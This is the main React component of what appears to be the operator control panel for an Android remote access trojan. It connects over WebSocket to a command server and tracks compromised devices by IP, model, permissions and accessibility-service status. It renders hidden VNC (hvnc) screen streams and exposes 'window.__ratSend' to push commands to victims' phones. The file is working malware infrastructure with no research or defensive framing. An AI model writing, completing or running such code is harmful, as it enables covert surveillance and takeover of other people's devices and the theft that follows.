import { useState, useEffect, useRef, useCallback } from 'react';
import Login from './components/Login';
import Sidebar from './components/Sidebar';
import DevicePanel from './components/DevicePanel';

// ── Constants ──────────────────────────────────────────────────────────────────

const RECONNECT_DELAYS = [1000, 2000, 4000, 8000, 15000, 30000];
const WS_URL = import.meta.env.VITE_WS_URL
  || `${window.location.protocol === 'https:' ? 'wss' : 'ws'}://${window.location.host}/panel`;

// ── App ────────────────────────────────────────────────────────────────────────

export default function App() {
  const [token,       setToken]       = useState(() => localStorage.getItem('token') || '');
  const [wsState,     setWsState]     = useState('idle');
  const [devices,     setDevices]     = useState([]);
  const [selectedId,  setSelectedId]  = useState(null);
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [errorBanner, setErrorBanner] = useState('');

  const wsRef          = useRef(null);
  const reconnectTimer = useRef(null);
  const reconnectIdx   = useRef(0);
  const hvncHandlerRef = useRef(null);

  // ── WebSocket lifecycle ────────────────────────────────────────────────────

  const connectWs = useCallback((t) => {
    if (!t) return;
    if (wsRef.current && wsRef.current.readyState < 2) return;

    setWsState('connecting');
    const ws = new WebSocket(WS_URL);
    wsRef.current = ws;

    ws.onopen = () => {
      setWsState('connected');
      reconnectIdx.current = 0;
      clearTimeout(reconnectTimer.current);
      ws.send(JSON.stringify({ type: 'auth', token: t }));
    };

    ws.onmessage = (ev) => {
      if (ev.data instanceof ArrayBuffer || ev.data instanceof Blob) {
        handleBinaryFrame(ev.data);
        return;
      }
      try {
        const msg = JSON.parse(ev.data);
        handleJsonMessage(msg);
      } catch {}
    };

    ws.onerror = () => setWsState('error');

    ws.onclose = (ev) => {
      setWsState('error');
      if (ev.code === 4003) {
        handleLogout();
        return;
      }
      scheduleReconnect(t);
    };
  }, []);

  const scheduleReconnect = useCallback((t) => {
    clearTimeout(reconnectTimer.current);
    const idx   = reconnectIdx.current;
    const delay = RECONNECT_DELAYS[Math.min(idx, RECONNECT_DELAYS.length - 1)];
    reconnectIdx.current = idx + 1;
    reconnectTimer.current = setTimeout(() => connectWs(t), delay);
  }, [connectWs]);

  // ── Message handlers ───────────────────────────────────────────────────────

  const handleJsonMessage = useCallback((msg) => {
    switch (msg.type) {
      case 'authenticated': {
        const list = (msg.devices || []).map(normalizeDevice);
        setDevices(list);
        break;
      }

      case 'device_online': {
        setDevices(prev => {
          const existing = prev.find(d => d.id === msg.deviceId);
          if (existing) {
            return prev.map(d => d.id === msg.deviceId
              ? { ...d, ...normalizeDevice({ id: msg.deviceId, ip: msg.ip, info: msg.info, online: true }) }
              : d
            );
          }
          return [normalizeDevice({ id: msg.deviceId, ip: msg.ip, info: msg.info, online: true }), ...prev];
        });
        break;
      }

      case 'device_offline': {
        setDevices(prev =>
          prev.map(d => d.id === msg.deviceId ? { ...d, online: false } : d)
        );
        break;
      }

      case 'device_list': {
        setDevices((msg.devices || []).map(normalizeDevice));
        break;
      }

      case 'battery_update': {
        setDevices(prev =>
          prev.map(d => d.id === msg.deviceId
            ? { ...d, battery_level: msg.level }
            : d
          )
        );
        break;
      }

      case 'permission_update': {
        setDevices(prev =>
          prev.map(d => d.id === msg.deviceId
            ? { ...d, permissions: msg.permissions }
            : d
          )
        );
        break;
      }

      case 'vnc_status': {
        setDevices(prev =>
          prev.map(d => d.id === msg.deviceId
            ? { ...d, vnc: { active: msg.active, method: msg.method } }
            : d
          )
        );
        break;
      }

      case 'accessibility_status': {
        setDevices(prev =>
          prev.map(d => d.id === msg.deviceId
            ? { ...d, accessibility: msg.active }
            : d
          )
        );
        break;
      }

      default:
        if (msg._from) {
          window.dispatchEvent(new CustomEvent('rat_msg', {
            detail: { deviceId: msg._from, msg },
          }));
        }
        break;
    }
  }, []);

  const handleBinaryFrame = useCallback(async (data) => {
    const buf = data instanceof Blob
      ? new Uint8Array(await data.arrayBuffer())
      : new Uint8Array(data);

    if (buf.length < 3) return;
    const frameType  = buf[0];
    const devIdLen   = (buf[1] << 8) | buf[2];
    if (buf.length < 3 + devIdLen) return;
    const deviceId   = new TextDecoder().decode(buf.slice(3, 3 + devIdLen));
    const payload    = buf.slice(3 + devIdLen);

    // FIX: guard — if no panel handler registered (panel unmounted), drop
    // silently instead of throwing on null ref
    if (hvncHandlerRef.current) {
      hvncHandlerRef.current(frameType, payload, deviceId);
    }
  }, []);

  // ── Effects ────────────────────────────────────────────────────────────────

  // FIX: added connectWs to deps — was [token] only, stale closure risk
  useEffect(() => {
    if (token) connectWs(token);
    return () => {
      clearTimeout(reconnectTimer.current);
      wsRef.current?.close();
    };
  }, [token, connectWs]);

  useEffect(() => {
    window.__ratSend = (deviceId, cmd) => {
      if (!wsRef.current || wsRef.current.readyState !== 1) return false;
      wsRef.current.send(JSON.stringify({ type: 'cmd', deviceId, cmd }));
      return true;
    };
  }, []);

  // ── Auth ───────────────────────────────────────────────────────────────────

  const handleLogin = (newToken) => {
    localStorage.setItem('token', newToken);
    setToken(newToken);
  };

  const handleLogout = () => {
    localStorage.removeItem('token');
    setToken('');
    setDevices([]);
    setSelectedId(null);
    wsRef.current?.close();
  };

  // ── Render ─────────────────────────────────────────────────────────────────

  if (!token) return <Login onLogin={handleLogin} />;

  const selectedDevice = devices.find(d => d.id === selectedId) || null;

  return (
    <div style={S.root}>

      {wsState !== 'connected' && (
        <div style={{
          ...S.banner,
          background: wsState === 'connecting' ? '#1a1a2e' : '#2a0a0a',
          borderBottom: `1px solid ${wsState === 'connecting' ? '#334' : '#500'}`,
        }}>
          <span style={{ color: wsState === 'connecting' ? '#aaa' : '#f66' }}>
            {wsState === 'connecting' ? '⟳ Connecting…' : '✕ Disconnected — reconnecting'}
          </span>
        </div>
      )}

      {sidebarOpen && (
        <div style={S.overlay} onClick={() => setSidebarOpen(false)} />
      )}

      <div style={S.layout}>
        <Sidebar
          devices={devices}
          selectedId={selectedId}
          onSelect={id => { setSelectedId(id); setSidebarOpen(false); }}
          onLogout={handleLogout}
          wsState={wsState}
          sidebarOpen={sidebarOpen}
        />

        <main style={S.main}>
          {selectedDevice
            ? <DevicePanel
                key={selectedDevice.id}
                device={selectedDevice}
                hvncHandlerRef={hvncHandlerRef}
                onSidebarOpen={() => setSidebarOpen(true)}
              />
            : <EmptyState devices={devices} onSelect={setSelectedId} />
          }
        </main>
      </div>
    </div>
  );
}

// ── Helpers ────────────────────────────────────────────────────────────────────

function normalizeDevice(raw) {
  const info = raw.info || {};
  return {
    id:              raw.id,
    ip:              raw.ip || info.ip || '',
    online:          raw.online ?? true,
    manufacturer:    info.manufacturer || raw.manufacturer || '',
    model:           info.model        || raw.model        || '',
    android_version: info.android_version || raw.android_version || '',
    alias:           raw.alias || info.alias || null,
    battery_level:   info.battery_level ?? raw.battery_level ?? -1,
    permissions:     info.permissions   || raw.permissions  || {},
    vnc:             raw.vnc            || { active: false, method: 'none' },
    accessibility:   info.accessibility_active ?? raw.accessibility ?? false,
    info,
  };
}

function EmptyState({ devices, onSelect }) {
  return (
    <div style={S.empty}>
      <div style={S.emptyTitle}>
        {devices.length === 0 ? 'Waiting for devices…' : 'Select a device'}
      </div>
      {devices.length > 0 && (
        <div style={S.emptyGrid}>
          {devices.map(d => (
            <button key={d.id} style={S.emptyCard} onClick={() => onSelect(d.id)}>
              <div style={{ ...S.dot, background: d.online ? '#00d26a' : '#333' }} />
              <div>
                <div style={{ color: '#ddd', fontSize: 13, fontWeight: 600 }}>
                  {d.alias || d.model || d.id.slice(0, 12)}
                </div>
                <div style={{ color: '#555', fontSize: 11, marginTop: 2 }}>
                  {d.manufacturer} · Android {d.android_version}
                </div>
              </div>
            </button>
          ))}
        </div>
      )}
    </div>
  );
}

// ── Styles ─────────────────────────────────────────────────────────────────────

const S = {
  root: {
    height: '100vh',
    display: 'flex',
    flexDirection: 'column',
    background: '#080810',
    color: '#ccc',
    fontFamily: "'JetBrains Mono', 'Fira Code', monospace",
    overflow: 'hidden',
  },
  banner: {
    padding: '6px 16px',
    fontSize: 12,
    flexShrink: 0,
    display: 'flex',
    alignItems: 'center',
    gap: 8,
    zIndex: 100,
  },
  layout: {
    flex: 1,
    display: 'flex',
    overflow: 'hidden',
    minHeight: 0,
  },
  main: {
    flex: 1,
    display: 'flex',
    flexDirection: 'column',
    overflow: 'hidden',
    minWidth: 0,
  },
  overlay: {
    position: 'fixed',
    inset: 0,
    background: 'rgba(0,0,0,.6)',
    zIndex: 50,
  },
  empty: {
    flex: 1,
    display: 'flex',
    flexDirection: 'column',
    alignItems: 'center',
    justifyContent: 'center',
    gap: 24,
    padding: 32,
  },
  emptyTitle: {
    fontSize: 14,
    color: '#444',
    letterSpacing: 1,
    textTransform: 'uppercase',
  },
  emptyGrid: {
    display: 'flex',
    flexWrap: 'wrap',
    gap: 12,
    justifyContent: 'center',
    maxWidth: 600,
  },
  emptyCard: {
    display: 'flex',
    alignItems: 'center',
    gap: 10,
    background: '#0f0f18',
    border: '1px solid #1e1e2a',
    borderRadius: 6,
    padding: '10px 16px',
    cursor: 'pointer',
    transition: 'border-color .15s',
    color: 'inherit',
    textAlign: 'left',
  },
  dot: {
    width: 8, height: 8,
    borderRadius: '50%',
    flexShrink: 0,
  },
};
